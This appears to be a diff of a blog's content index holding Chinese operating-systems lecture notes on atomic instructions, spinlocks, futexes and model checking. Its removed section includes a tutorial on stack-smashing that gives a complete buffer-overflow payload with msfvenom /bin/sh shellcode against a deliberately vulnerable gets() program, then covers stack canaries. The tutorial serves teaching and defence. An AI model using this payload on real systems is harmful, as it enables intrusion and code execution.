+<p>由于这里的 +1 操作使用了原子指令，所以程序总能得到 2N 的输出。</p>
+<p>此外，一条非常好用的原子指令是 xchg，它可以原子地将一个数值和一个内存地址上的值交换。用 C 语言封装后的形式可以是：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *addr, <span class="keyword">int</span> newval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span></span>; <span class="comment">//xchg默认原子，即使不加前缀lock也可以</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>借助 <code>xchg</code> 指令，我们可以轻松地实现一个自旋锁：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> lock = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;<span class="keyword">while</span> (xchg(&amp;lock, <span class="number">1</span>));&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;xchg(&amp;lock, <span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在硬件层面，硬件可以保证所有的带 lock 的指令可以排出一个全序，且原子指令相关的内存都会被提前做好 (内存的可见性)。但这其中有很多技术细节，比如多核的 Cache 之间的一致性是 x86 的噩梦 (一旦某个 CPU 要获得所，其他所有 CPU 核的 L1 Cache 都要上锁)。</p>
+<h3 id="RISC-V-LR-SC"><a href="#RISC-V-LR-SC" class="headerlink" title="RISC-V: LR/SC"></a>RISC-V: LR/SC</h3><p>原子指令内部的本质是三个步骤：load(), exec(), store()。RISC-V 提供了 load-reserved/store-conditional (LR/SC) 机制：</p>
+<ul>
+<li>LR: 在共享内存上打一个标记，如果出现中断、别的线程写入等情况，这个标记会消失。</li>
+<li>exec()：在寄存器上做一些自己的事情</li>
+<li>SC：如果共享内存上的标记还在，则 store。</li>
+</ul>
+<p>这里给出一个用于自旋锁的 compare-and-swap (旧值等于某个值才将新值与其交换) 函数的实现，用这个函数实现自旋锁在轮询时可以比 xchg 少一次写入操作：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// C语言语义</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cas</span><span class="params">(<span class="keyword">int</span> *addr, <span class="keyword">int</span> cmp_val, <span class="keyword">int</span> new_val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> old_val = *addr;</span><br><span class="line">    <span class="keyword">if</span> (old_val == cmp_val) &#123;*addr = new_val;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cas:</span><br><span class="line">	lr.w t0, (a0)		# 获得旧值，并对(a0)打标记</span><br><span class="line">	bne t0, a1, fail	# 如果 old_val != cmp_val 则跳转到 fail</span><br><span class="line">	sc.w t0, a2, (a0)	# 如果标记还在，将a2写入(a0)，t0存储标记存在情况</span><br><span class="line">	bnez t0, cas		# 如果标记被冲刷了，说明出现race condition，回到cas重做</span><br><span class="line">	jr ra</span><br><span class="line">fail</span><br><span class="line">	li a0, 1</span><br><span class="line">	jr ra</span><br></pre></td></tr></table></figure>
+
+<p>如果有两个线程同时希望获得锁，第一个线程执行完 sc.w 后，第二个线程的标记被冲刷，从而第二个线程执行 sc.w 后 t0=1，无法获得锁。</p>
+<p>LR/SC 机制不仅可以实现锁，还可以让每个线程知道锁的拥堵情况。</p>
+<h2 id="Sleep-Lock"><a href="#Sleep-Lock" class="headerlink" title="Sleep Lock"></a>Sleep Lock</h2><p>自旋锁的性能缺陷：</p>
+<ul>
+<li>如果多个线程同时争抢锁，并行/并发的程序会因为自旋锁变得串行。除了进入临界区域的线程，其他的线程都在空转。</li>
+<li>如果持有自旋锁的线程被调度走了，那么所有的线程都进不去了。</li>
+</ul>
+<p>自旋锁的理想使用场景：</p>
+<ul>
+<li>临界区几乎不拥堵。</li>
+<li>持有自旋锁时禁止执行流切换 - 这件事对于应用程序来说太危险了，因此自旋锁一般用于操作系统内核中的并发数据结构 (临界区很短)。</li>
 </ul>
 <hr>
-<p>假设 Alice 和 Bob 想上厕所，为了不一起进入厕所，他们制定了如下协议：</p>
+<p>如果锁被占用，待在原地等待锁被释放是一件不太聪明的事情 (尤其是要等很长时间的时候)，我们希望一个线程在等待锁的时候可以被暂时挂起，让出 CPU，等到锁被释放时再唤醒等锁进程。</p>
+<p>C 语言代码是做不到 ”让出 CPU 的”，因此我们需要两个系统调用：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(SYSCALL_lock, &amp;lk);		<span class="comment">// 试图获得lk，如果失败则当前进程被挂起</span></span><br><span class="line">syscall(SYSCALL_unlock, &amp;lk);	<span class="comment">// 释放lk，并唤醒正在等待lk的进程</span></span><br></pre></td></tr></table></figure>
+
+<p>操作系统的工作是维护这个锁和等待锁的进程</p>
 <ul>
-<li>Alice 想上厕所，于是举起了自己的旗子 (step1，相当于 STORE 一个共享的变量)，然后将 Bob (对方) 的名字写在厕所门上 (step2，也相当于 STORE 一个共享变量)；如果 Bob 想上厕所也是同理。注意厕所门上的名字是可以覆盖的。</li>
-<li>Alice 检查门上的名字和厕所 (step3)，Alice 可以进入厕所当且仅当 Bob 没有举旗子，或者门上的名字是自己的。</li>
-<li>Alice 上完厕所后，把自己的旗子放下来 (step4)。</li>
+<li>如果有线程尝试获得锁，且锁处于空闲状态，就把锁给他。</li>
+<li>如果有线程尝试获得锁但锁已经被取走了，则将当前线程加入等待锁的队列，并将其挂起。</li>
+<li>如果有线程释放了锁，就检查等待锁的队列中是否有线程，如果有则将锁交给下一位 (唤醒它)，如果没有则锁的状态为空闲。</li>
+<li>操作系统使用自旋锁保证自己对队列的操作是原子的。</li>
 </ul>
-<p>我们讨论几种情况：</p>
-<ul>
-<li>Alice 检查的时候，如果 Bob 没举旗子，说明 Bob 还不想上厕所，那 Alice 可以上厕所。</li>
-<li>如果 Bob 也举旗子了，那结果是：先举旗子的人可以先进入厕所，因为后举旗子的人会把先举旗子的人的名字贴在门上，覆盖了先贴的人的内容。</li>
-<li>……</li>
+<blockquote>
+<p><strong>Tip: GDB Usage</strong></p>
+<p>使用 GDB 调试多线程时，如果直接使用 next 命令，所有的线程都会向后走一步。为了更好地观测程序行为，我们可以使用 <code>set scheduler-lock on</code> 命令来打开线程锁，之后再使用 next 命令就只有当前线程会向前走一步。我们可以通过 <code>info threads</code> 来查看线程信息，通过 <code>thread id</code> 来切换当前调试的线程为 id。</p>
+</blockquote>
+<h2 id="Futex"><a href="#Futex" class="headerlink" title="Futex"></a>Futex</h2><ul>
+<li>自旋锁有更快的 fast path：如果获得锁成功，可以立刻进入临界区；但如果没有获得锁，则要浪费 CPU 时钟周期。</li>
+<li>睡眠锁有更快的 slow path: 如果没有获得锁，可以执行线程切换；但在能获得锁的情况下，也需要执行系统调用陷入内核。</li>
 </ul>
-<p>一个完备的证明方法是画状态机。我们设置状态机 $(PC_1, PC_2, x, y, turn,status)$，六个状态分别表示 T1/T2 执行到第几行，T1/T2 的旗子有没有举起来，当前厕所门上写的是谁的名字，以及当前厕所状态。</p>
-<pre class="mermaid">stateDiagram-v2
-    s1: (1, 1, 0, 0, A, e)
-    s1 --> s2: T1
-    s2: (2, 1, 1, 0, A, e)
-    s1 --> s3: T2
-    s3: (1, 2, 0, 1, A, e)
-    note left of s3
-        T1先执行与T2先执行完全等价
-        该分支省略
-    end note
-    s2 --> s4: T1
-    s4: (3, 1, 1, 0, B, e)
-    s2 --> s5: T2
-    s5: (2, 2, 1, 1, A, e) 
-    s4 --> s6: T1
-    s6: (3, 1, 1, 0, B, A)
-    s4 --> s7: T2
-    s7: (3, 2, 1, 1, B, e)
-    s7 --> s7: T1
-    s7 --> s20: T2
-    s20: (3, 3, 1, 1, A, e)
-    s20 --> s14: T1
-    s20 --> s20: T2
-    s5 --> s7: T1
-    s5 --> s9: T2
-    s9: (2, 3, 1, 1, A, e)
-    note right of s9
-        与左孩子完全等价
-        该分支省略
-    end note
-    s6 --> s10: T1
-    s6 --> s11: T2
-    s11: (3, 2, 1, 1, B, A)
-    s10: (4, 1, 1, 0, B, e)
-    s10 --> s12: T1
-    s10 --> s15: T2
-    s12: (1, 1, 0, 0, B, e)
-    s15: (4, 2, 1, 1, B, e)
-    s11 --> s15: T1
-    s11 --> s14: T2
-    s14: (3, 3, 1, 1, A, A)
-    s14 --> s17: T1
-    s14 --> s14: T2
-    s15 --> s16: T1
-    s15 --> s17: T2
-    s16: (1, 2, 0, 1, B, e)
-    s17: (4, 3, 1, 1, A, e)
-    s17 --> s18: T1
-    s17 --> s17: T2
-    s18: (1, 3, 0, 1, A, e)</pre>
+<p>我们希望发明一种锁，对于 fast path，只需要一条原子指令就可以获得锁，对于 slow path，可以通过系统调用 yield。这就是 Futex = spin + mutex。</p>
+<p>我们可以利用 model checker 来确认 futex 的正确性：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Futex</span></span></span><br><span class="line"><span class="class">	<span class="title">locked</span>, <span class="title">waits</span> = &#x27;&#x27;, &#x27;&#x27;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">tryacquire</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.locked:</span><br><span class="line">            <span class="comment"># Test-and-set (cmpxchg)</span></span><br><span class="line">            <span class="comment"># Same effect, but more efficient than xchg</span></span><br><span class="line">            self.locked = <span class="string">&#x27;🔒&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;🔒&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">release</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.waits:</span><br><span class="line">            self.waits = self.waits[<span class="number">1</span>:]		  <span class="comment"># 将队首元素踢出队列 &lt;=&gt; 将编号为队首元素的线程唤醒</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.locked = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t1</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.tryacquire() == <span class="string">&#x27;🔒&#x27;</span>:     <span class="comment"># User</span></span><br><span class="line">                self.waits = self.waits + <span class="string">&#x27;1&#x27;</span> <span class="comment"># Kernel</span></span><br><span class="line">                <span class="keyword">while</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> self.waits:      <span class="comment"># Kernel</span></span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            cs = <span class="literal">True</span>                         <span class="comment"># User</span></span><br><span class="line">            <span class="keyword">del</span> cs                            <span class="comment"># User</span></span><br><span class="line">            self.release()                    <span class="comment"># Kernel</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @thread</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">t2</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> self.tryacquire() == <span class="string">&#x27;🔒&#x27;</span>:</span><br><span class="line">                self.waits = self.waits + <span class="string">&#x27;2&#x27;</span></span><br><span class="line">                <span class="keyword">while</span> <span class="string">&#x27;2&#x27;</span> <span class="keyword">in</span> self.waits:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">            cs = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">del</span> cs</span><br><span class="line">            self.release()</span><br></pre></td></tr></table></figure>
 
-<p>我们还可以写一个小程序验证 Peterson：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BARRIER __sync_synchronize()	</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">critical_section</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> cnt = atomic_fetch_add(&amp;count, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">int</span> i = atomic_fetch_add(&amp;nested, <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d threads in the critical section @ count=%ld\n&quot;</span>, i, cnt);</span><br><span class="line">    assert(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  atomic_fetch_add(&amp;nested, <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="keyword">volatile</span> x = <span class="number">0</span>, y = <span class="number">0</span>, turn;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = <span class="number">1</span>;                   BARRIER;</span><br><span class="line">    turn = B;                BARRIER; <span class="comment">// &lt;- this is critcal for x86</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!y) <span class="keyword">break</span>;         BARRIER;</span><br><span class="line">      <span class="keyword">if</span> (turn != B) <span class="keyword">break</span>;  BARRIER;</span><br><span class="line">    &#125;</span><br><span class="line">    critical_section();</span><br><span class="line">    x = <span class="number">0</span>;                   BARRIER;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    y = <span class="number">1</span>;                   BARRIER;</span><br><span class="line">    turn = A;                BARRIER;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!x) <span class="keyword">break</span>;         BARRIER;</span><br><span class="line">      <span class="keyword">if</span> (turn != A) <span class="keyword">break</span>;  BARRIER;</span><br><span class="line">    &#125;</span><br><span class="line">    critical_section();</span><br><span class="line">    y = <span class="number">0</span>;                   BARRIER;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在 critical_section() 中，代码主要做的事情是操作一个共享变量，如果某个时刻 <code>nested == 2</code>，说明两个线程同时进入了临界区域，则报错。</p>
-<p>由于现代编译器和多处理器会调整语句顺序/乱序执行……所以我们在每条语句后面添加一条 <code>__sync_synchronize()</code> 来保证编译按照顺序进行，且多处理器之间具有可见性。事实证明，如果去掉 BARRIER 会发生错误。</p>
-<h2 id="Model-Checker"><a href="#Model-Checker" class="headerlink" title="Model Checker"></a>Model Checker</h2><p>我们希望用程序自动画出状态机。<a href="https://kristoff-starling.github.io/files/model-checker.py">model-checker.py</a> 帮助我们完成了这项工作，其中用到的 python 语言机制较多，暂时留坑。我们可以用 <code>model-checker.py</code> 中编写的装饰器来编写多个线程，<a href="https://kristoff-starling.github.io/files/peterson-flag.py">peterson-flag.py</a> 是一个示例。使用命令 <code>python3 model-checker.py xxx.py</code> 可以输出状态机的所有节点和转移关系。</p>
-<p><code>model-checker.py</code> 主要利用了 python generator 的机制来快速获得进程的状态机。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numbers</span>(<span class="params">init=<span class="number">0</span>, step=<span class="number">1</span></span>):</span></span><br><span class="line">    n = init</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n += step</span><br><span class="line">        <span class="keyword">yield</span> n</span><br><span class="line"></span><br><span class="line">g = numbers()</span><br><span class="line">h = numbers(<span class="number">100</span>, <span class="number">200</span>)</span><br><span class="line"><span class="built_in">print</span>(g, h)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(h.__next__())</span><br><span class="line"><span class="built_in">print</span>(g.__next__())</span><br><span class="line"><span class="built_in">print</span>(h.__next__())</span><br></pre></td></tr></table></figure>
-
-<p>该程序输出结果为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;generator object numbers at 0x7f0a75b4fcf0&gt; &lt;generator object numbers at 0x7f0a759f9ba0&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">300</span><br><span class="line">3</span><br><span class="line">500</span><br></pre></td></tr></table></figure>
-
-<p>虽然 numbers() 里面是一个死循环，但执行 numbers() 还是可以退出，这得益于 <code>yield</code> 语句，yield 的功能类似于操作系统的调度，它会主动让出执行流。<code>g.__next__()</code> 语句可以从被打断处重新进入，继续执行函数直到遇到下一次 yield。如果我们在每一条语句后面都加上一个 yield，让 yield 后面返回所有的线程局部变量，我们就获得了函数每执行一步之后的状态机。</p>
-<p>Model checker 将验证程序正确性的问题转化成了一个图论问题：</p>
+<blockquote>
+<p><strong>Tip: 强大的 model checker</strong></p>
 <ul>
-<li><p>Safety (线程是否互斥)：从初始状态出发，是否存在到红色 (互斥失败) 节点的路径？</p>
-<blockquote>
-<p>图搜索</p>
-</blockquote>
-</li>
-<li><p>Liveness：是否从任意黑色 (没有人执行临界区域代码) 状态出发，总能在有限步内到达蓝色/绿色 (有一个线程执行临界区域代码) 节点？</p>
-<blockquote>
-<p>这等价于只考虑图中的黑色节点，是否存在环。只要对黑色节点的导出子图求 SCC 即可。</p>
-</blockquote>
+<li><p>我们的 model checker 的原理是：对于有装饰器 thread 修饰的函数，在每条语句后添加 yield。因此我们可以轻松地实现一个原子的操作：只要将操作写成一个函数，并在一行内调用这个函数即可。再例如，xchg 原子操作在我们的 model checker 中可以很简单地写为</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y = y, x</span><br></pre></td></tr></table></figure></li>
+<li><p>线程函数中的语句</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">in</span> self.waits:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>  并不是内核的真正行为：内核会切换走去执行别的线程。但从这个正在等待的线程的视角，内核在做和自己无关的事等价于内核在自己这里轮询。因此我们精巧地模拟出了内核的正确行为。</p>
 </li>
 </ul>
+</blockquote>
 ]]></content>
       <categories>
         <category>NJU-22020230 Operating Systems</category>
         <category>Lecture Notes</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Stack-smashing Attack: An Introduction</title>
-    <url>/2022/02/28/Stack-smashing%20Attack%20-%20An%20Introduction/</url>
-    <content><![CDATA[<p>本文主要介绍一段简单的栈溢出攻击代码，并简介几种 Linux 中防止栈溢出攻击的方法。</p>
-<h2 id="Hack-Code"><a href="#Hack-Code" class="headerlink" title="Hack Code"></a>Hack Code</h2><blockquote>
-<p>注：为了实现的简单，受攻击的 C 程序编译时应加上如下参数：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o vuln vuln.c -fno-<span class="built_in">stack</span>-protector -z execstack</span><br></pre></td></tr></table></figure>
-
-<p>这两个参数使得栈上数据可执行并取消了栈溢出检查。此外，我们还需要手动关闭 ASLR。</p>
-</blockquote>
-<span id="more"></span>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> msg[<span class="number">32</span>];</span><br><span class="line">	gets(msg);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, msg);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>gets(msg)</code> 函数是一个非常危险的字符串读取函数，因为它完全无法控制会读取到几个字符，一旦读取的字符串长度超过 msg 的长度就会发生缓冲区溢出。最新版的 C 标准已经将 gets() 函数移除，fgets() 指定输入文件为 stdin 可以达到和 gets 相同的效果，不同的是 fgets() 可以指定输入长度的上限。下面介绍的 hack 代码正是利用了 gets() 不检查溢出的特性。</p>
-<p>使用 GDB 进行调试，通过命令 <code>i r rsp</code> 和 <code>i r rbp</code> 确定栈帧的位置，通过 <code>x/32x $rsp</code> 检查栈帧附近的内容，并确定 buf[] 的首地址为 0x7fffffffdd60。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsp = 0x7fffffffdd50 rbp = 0x7fffffffdd80 buf = 0x7fffffffdd60</span><br><span class="line"></span><br><span class="line">0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001</span><br><span class="line">0x7fffffffdd60:	0x00000000	0x00000000	0x55555080	0x00005555</span><br><span class="line">0x7fffffffdd70:	0xffffde70	0x00007fff	0x00000000	0x00000000</span><br><span class="line">0x7fffffffdd80:	0x00000000	0x00000000	0xf7de9565	0x00007fff</span><br><span class="line">0x7fffffffdd90:	0xffffde78	0x00007fff	0xf7fc7000	0x00000001</span><br><span class="line">0x7fffffffdda0:	0x55555169	0x00005555	0xffffe209	0x00007fff</span><br><span class="line">0x7fffffffddb0:	0x555551a0	0x00005555	0xace3e1b6	0x2c1321da</span><br><span class="line">0x7fffffffddc0:	0x55555080	0x00005555	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
-
-<p>根据调用规约，在 64 位机器上，<code>rbp + 8</code> 处存放的是返回地址 0x7ffff7de9565。我们攻击的核心目标是利用 gets() 的缓冲区溢出改写返回地址，使得 main() 函数返回时可以跳转到我们的“恶意程序”上继续执行。</p>
-<p>我们的 hack code 如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41</span><br><span class="line">\x90\xdd\xff\xff\xff\x7f\x00\x00</span><br><span class="line">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52</span><br><span class="line">\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69</span><br><span class="line">\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>第一部分是 40 个字符 A，它的目的是填充整个栈帧，一直填到返回地址之前。</p>
-</li>
-<li><p>第二部分是我们希望的返回地址，这个数值是 0x7fffffffdd90 (返回地址所在地址的下一位)。由于我们提前关闭了 ASLR，所以栈帧的地址和返回地址都是不变的，我们可以直接将这个数值硬编码在 hack code 里。</p>
-</li>
-<li><p>第三部分是一串空字符，称为 NOP sled。在本程序中是不必要的 (因为没有 ASLR)，在打开 ASLR 的情况下，一段 NOP sled 可以提高攻击成功的概率，因为我们只要让返回地址落在 NOP sled 的范围内，CPU 便会执行 nop 指令，PC 不断后移，直到来到我们的恶意代码。</p>
-</li>
-<li><p>第四部分是我们的恶意程序，我们希望打开一个新的程序 <code>/bin/sh</code>。这里笔者使用了工具 msfvenom：</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/<span class="built_in">exec</span> CMD=/bin/sh -f c</span><br></pre></td></tr></table></figure>
-
-<p>  它可以自动生成一段打开 <code>/bin/sh</code> 的机器指令，并以 C 风格输出：</p>
-  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Payload size: <span class="number">44</span> bytes</span><br><span class="line">Final size of c file: <span class="number">209</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05&quot;</span>;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>在 GDB 中运行，设置好断点后，通过 <code>run &lt; malice</code> 命令可以将输入重定向到我们的恶意代码。在 main() 函数返回之前，栈帧的数据如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001</span><br><span class="line">0x7fffffffdd60:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffdd70:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffdd80:	0x41414141	0x41414141	0xffffdd90	0x00007fff</span><br><span class="line">0x7fffffffdd90:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x7fffffffdda0:	0x90909090	0x90909090	0x622fb848	0x732f6e69</span><br><span class="line">0x7fffffffddb0:	0x50990068	0x66525f54	0x54632d68	0x08e8525e</span><br><span class="line">0x7fffffffddc0:	0x2f000000	0x2f6e6962	0x56006873	0x6a5e5457</span><br><span class="line">0x7fffffffddd0:	0x050f583b	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
-
-<p>可以看到 buf 前半部分都是 A，后面跟着我们的返回地址，一段 NOP sled 后是我们的恶意代码。</p>
-<p>继续执行，可以看到执行了一堆 push,pop 之后，最核心的三句话为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push $0x3b</span><br><span class="line">pop $rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-
-<p>0x3b 是 execve() 系统调用的系统调用号，执行到 syscall 后，GDB 会提示：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">process 62464 is executing new program: /usr/bin/dash</span><br></pre></td></tr></table></figure>
-
-<p>我们的 hack code 成功运行了一个其他程序。</p>
-<h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>为了避免程序被过分容易地 hack，Linux 中有若干种栈溢出保护的机制。</p>
-<p>Stack Canary (金丝雀) 的思路是：在创建栈帧时，在栈帧底部存放一个特殊的值，这个值被称为金丝雀，并在函数返回之前查看金丝雀是否改变。如果函数执行过程中发生了栈溢出，则金丝雀一定被覆盖了，一旦发现金丝雀被改变则直接报错。</p>
-<p>对于之前的示例代码 <code>vuln.c</code>，如果我们在编译时不添加 <code>-fno-stack-protector</code>，观察反编译结果，可以看到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001189 &lt;main&gt;:</span><br><span class="line">1189:	f3 0f 1e fa          	endbr64 </span><br><span class="line">118d:	55                   	push   %rbp</span><br><span class="line">118e:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">1191:	48 83 ec 40          	sub    $0x40,%rsp</span><br><span class="line">1195:	89 7d cc             	mov    %edi,-0x34(%rbp)</span><br><span class="line">1198:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)</span><br><span class="line">119c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">11a3:	00 00 </span><br><span class="line">11a5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">		......					......</span><br><span class="line">11cd:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx</span><br><span class="line">11d1:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx</span><br><span class="line">11d8:	00 00 </span><br><span class="line">11da:	74 05                	je     11e1 &lt;main+0x58&gt;</span><br><span class="line">11dc:	e8 9f fe ff ff       	call   1080 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">11e1:	c9                   	leave  </span><br><span class="line">11e2:	c3                   	ret    </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
-
